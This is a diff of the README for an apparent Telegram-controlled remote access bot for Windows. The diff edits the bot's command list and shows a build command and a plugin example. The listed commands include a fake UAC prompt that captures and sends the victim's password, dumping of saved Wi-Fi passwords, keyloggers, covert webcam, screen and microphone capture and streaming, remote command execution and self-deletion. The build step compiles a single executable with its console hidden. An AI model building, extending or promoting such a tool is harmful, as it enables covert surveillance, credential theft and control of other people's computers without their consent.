@@ -4,92 +4,94 @@ Remote Control Bot, inspired to the previous creation named "Peppino", this one 
 
 ```/help: 
 🏠 Main Menu
-mainmenu - Sends the main menu.
+mainmenu - Shows main menu.
 🛑 System & Shutdown
-fakeuac - Displays a fake uac prompt and sends you the password.
-shutdown - Shut down the PC.
-fakeshutdown - Fake system shutdown.
-altf4 - Simulate Alt + F4.
-clear - Removes all cv2 windows, closes webcam and removes temporary files.
-selfdestruction - Removes the program from the machine permanently.
+fakeuac - Fake UAC prompt, sends password.
+shutdown - Power off PC.
+fakeshutdown - Fake shutdown sequence.
+altf4 - Press Alt+F4.
+clear - Clean windows, webcam, temp files.
+selfdestruction - Remove program permanently.
 🌐 Network & Remote Access
-wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
-getip - Get public IP and geolocation.
+wifiinfo - Show saved WiFi passwords.
+getip - Get public IP and location.
 📸 Camera & Screen
-selfie - Take a webcam selfie.
+selfie - Take webcam photo.
 screenshot - Capture screen.
 fullclip - Record screen + webcam.
-webcamclip - Record webcam.
-screenclip - Record screen.
-recordjum - Records 20 second clip of jumpscare.
-waitforface - Send a webcam photo when face is detected till timeout.
-displaymode - Send a display set menu.
-webcamstreamstart - Sets you a link to a webcam stream.
-screenstreamstart - Sets you a link to a screen stream.
-webcamstreamstop - Stops the webcam stream.
-screenstreamstop - Stops the screen stream.
-webcamandscreenstreamstart - Sets you a link to a webcam and screen stream.
-webcamandscreenstreamstop - Stops the webcam and screen stream.
+webcamclip - Record webcam only.
+screenclip - Record screen only.
+recordjum - Record 20s jumpscare reaction.
+waitforface - Send photo when face detected.
+displaymode - Change display settings.
+webcamstreamstart - Start webcam stream.
+screenstreamstart - Start screen stream.
+webcamstreamstop - Stop webcam stream.
+screenstreamstop - Stop screen stream.
+webcamandscreenstreamstart - Both streams.
+webcamandscreenstreamstop - Stop both streams.
 🔊 Audio & Volume
-urltoast - Shows a url opening windows toast.
+urltoast - Windows toast with URL.
 breath - Play breathing sound.
-pss - Plays "psst" sound.
-fart - Plays a fart sound.
-knockknock - Plays a knock on a door sound, pretty realistic too.
-microphone - Record mic audio.
-mutevolume - Set computer's volume to 0.
-fullvolume - Set computer's volume to 100.
-setvolume - Set computer's volume level.
-getvolume - Gets the computer's volume level.
-tralalerotralala - Plays italian brainrot.
-mixermenu - Sends a mixer menu.
-playfromurl - Plays an audio from an url. (WAV, MP3, OGG)
+pss - Play "psst" sound.
+fart - Play fart sound.
+playrandomnoise - Play static/interference.
+knockknock - Play door knocking.
+microphone - Record audio from mic.
+mutevolume - Mute system.
+fullvolume - Max volume.
+setvolume - Set volume level.
+getvolume - Check current volume.
+tralalerotralala - Play Italian brainrot.
+mixermenu - Audio controls menu.
+playfromurl - Play audio from URL.
 😈 Pranks & Visuals
-jumpscare - Show random jumpscare.
-jumpscarenoaudio - Jumpscare no audio.
-invertedscreen - Shows inverted colors screenshot.
-distortedscreen - Shows distorted screenshot.
-messagebox - Show a custom message box.
+jumpscare - Random jumpscare.
+jumpscarenoaudio - Jumpscare without sound.
+invertedscreen - Invert screen colors.
+distortedscreen - Distort screen image.
+messagebox - Custom message box.
 messagespam - Spam message boxes.
-camerawallpaper - Sets webcam's frames as wallpaper.
-setvideowallpaper - Sets a video as wallpaper.
-hdmi_drowning_effect - Sets a noise/disturbed effect overlay on screen.
-stop_hdmi_drowning_effect - Stops the noise/disturbed effect overlay on screen.
+camerawallpaper - Webcam as wallpaper.
+setvideowallpaper - Video as wallpaper.
+hdmi_drowning_effect - Noise overlay.
+stop_hdmi_drowning_effect - Stop overlay.
+disturbed_overlay_and_random_noise - Noise overlay + audio.
 💻 System Control
 execute - Run system command.
-processkiller - Shows a table of processes that you can kill.
-terminateprocess - Kills a process by name.
-procmonmenu - Shows procmon menu.
-procmonadd - Adds a process to the process monitor list.
-procmonrem - Removes a process to the process monitor list.
-cmdsession - Enters a local cmd session.
+processkiller - Kill process from list.
+terminateprocess - Kill process by name.
+procmonmenu - Process monitor menu.
+procmonadd - Add to process monitor.
+procmonrem - Remove from process monitor.
+cmdsession - Open CMD session.
 🎮 Input / Device Control
-randomkeyboard - Sets all user's input to random characters.
-capslock - Activates capslock.
-mousecontroller - Sends a mouse controlling menu.
-mouselock - Locks the mouse in position.
-setMouseJump - Sets the jump of the mouse in mousecontroller.
+randomkeyboard - Randomize keyboard input.
+capslock - Toggle Caps Lock.
+mousecontroller - Mouse control menu.
+mouselock - Lock mouse position.
+setMouseJump - Set mouse movement distance.
 📋 Messaging
-bsend - Send custom text.
-id - Get Owner Chat ID.
-deletemessages - Deletes the specifed number of messages.
-deleteallmessages - Deletes all the messages in this session.
+bsend - Send text message.
+id - Get chat ID.
+deletemessages - Delete last N messages.
+deleteallmessages - Delete all messages.
 🔒 Can't Open List
-cantopenadd - Adds process to cantopenlist.
-cantopenremove - Removes process from cantopenlist.
-cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
+cantopenadd - Block process.
+cantopenremove - Unblock process.
+cantopenmenu - View blocked processes.
 🧠 Keylogger
-keylogger - Records pressed keys on keyboard.
-livekeylogger - Sends live updates about what's being typed on the keyboard.
+keylogger - Log keystrokes to file.
+livekeylogger - Live keystroke updates.
 🦑 Misc
-plankton - Plankton.
-planktonnoaudio - Plankton no audio.
-johnpork - John Pork.
-johnporknoaudio - John Prok no audio.
-gabinetti - Gabinetti nella villa.
-duckyscript - Execute duckyscript string.
-duckyhelp - Show Duckyscript tutorial.
-browser - Open URL in browser.
+plankton - Plankton jumpscare.
+planktonnoaudio - Plankton without audio.
+johnpork - John Pork jumpscare.
+johnporknoaudio - John Pork without audio.
+gabinetti - Gabinetti meme.
+duckyscript - Run DuckyScript.
+duckyhelp - DuckyScript commands.
+browser - Open URL.
 📎 File Input Commands
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
@@ -146,9 +148,7 @@ I could not add it because github has a 100MB limit and the executable was 114MB
 nuitka pep2.py --standalone --windows-console-mode=disable --onefile --follow-imports --msvc=latest --include-data-dir=assets/vfx=assets/vfx --include-data-dir=assets/sfx=assets/sfx --include-data-dir=assets/model=assets/model --include-data-file=auth.json=auth.json --include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe
 ```
 ## 🧩 Plugin System
-
 RCPepTelegram supports **class-based plugins** that integrate directly with the bot, UI, and messaging system.
-
 ### 📁 Plugin Structure
 
 ```
@@ -157,29 +157,23 @@ plugins/
 ├── system_plugins.py
 └── custom_plugins.py
 ```
-
 ### 🧪 Minimal Plugin Example
 
 ```python
 from .plugin_base import Plugin
 import os
-
 class ShutdownTimed(Plugin):
     def __init__(self):
         super().__init__("⏻ Schedule Shutdown", "shutdown_timed")
-
     def action(self, seconds: int = 60):
         os.system(f"shutdown -s -t {seconds}")
         self.pep2.bsend(f"Shutdown scheduled in {seconds} seconds.")
 ```
-
 ### 🧠 Plugin Rules
-
 - Inherit from `Plugin`
 - `__init__(label, command)` sets button name and Telegram command
 - `action(...)` is triggered on command/button click
 - `self.pep2` is the reference to the running `PeppinoTelegram` instance
-
 ### 📌 Plugin Registration
 
 ```python
